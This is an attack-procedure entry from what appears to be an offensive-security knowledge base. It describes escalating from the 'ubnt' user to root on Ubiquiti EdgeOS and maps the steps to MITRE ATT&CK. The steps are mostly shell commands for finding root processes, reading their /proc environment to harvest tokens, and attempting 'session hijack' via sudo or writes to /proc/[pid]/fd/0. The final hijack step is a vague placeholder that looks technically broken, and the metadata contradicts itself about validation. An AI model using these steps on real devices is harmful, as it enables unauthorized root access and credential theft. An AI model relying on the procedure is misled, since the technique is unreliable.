---
id: proc-edgeos-ubnt-to-root-001
tags:
  - privilege-escalation
  - session-hijacking
  - linux
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/ps-process-list]]'
  - '[[commands/cat-proc-env]]'
  - '[[commands/sudo-root-elevate]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:29:27.961Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Default Accounts]]'
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# EdgeOS Ubnt to Root Session Hijacking

## Summary

This procedure uses exposed process information from the 'ubnt' user context to hijack a non-interactive root session in Ubiquiti EdgeOS, achieving full system control.

## Description

Once escalated to 'ubnt', attackers can access /proc/ filesystem to read root process environments or sudo configurations, enabling non-interactive hijacking of elevated sessions due to insufficient protections.

## Requirements

1. 'ubnt' user access (from prior escalation)
2. Running root processes with exposed env
3. EdgeOS 1.9.1 or prior

## Defense

Defensive measures and detection strategies:

- Restrict /proc/ reads for non-root users
- Enable sudo logging and auditd for session attempts
- Patch to newer EdgeOS versions with fixed protections

## Objectives

1. Identify root processes
2. Extract session data
3. Hijack to root shell

## Instructions

### Step 1: List Root Processes

**Context**: Find active root PIDs for hijacking.

**Command** ([[commands/ps-process-list]]):
```bash
ps aux | grep root
```

> Identifies PIDs of root-owned processes.

### Step 2: Read Process Environment

**Context**: Extract sensitive env vars from root process.

**Command** ([[commands/cat-proc-env]]):
```bash
cat /proc/[root-pid]/environ
```

> Reveals tokens or paths for hijacking.

### Step 3: Perform Non-Interactive Hijack

**Context**: Use sudo or session injection to elevate.

**Command** ([[commands/sudo-root-elevate]]):
```bash
sudo -n -i
# Or inject via: echo 'root-session-hijack' | sudo tee /proc/[pid]/fd/0
```

> Gains root shell if hijack succeeds.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques

- [[Default Accounts]] Default Accounts

## Commands Used

- [[commands/ps-process-list]]
- [[commands/cat-proc-env]]
- [[commands/sudo-root-elevate]]

## Tools Used


## Tags

- [[session-hijacking]]
- [[linux]]
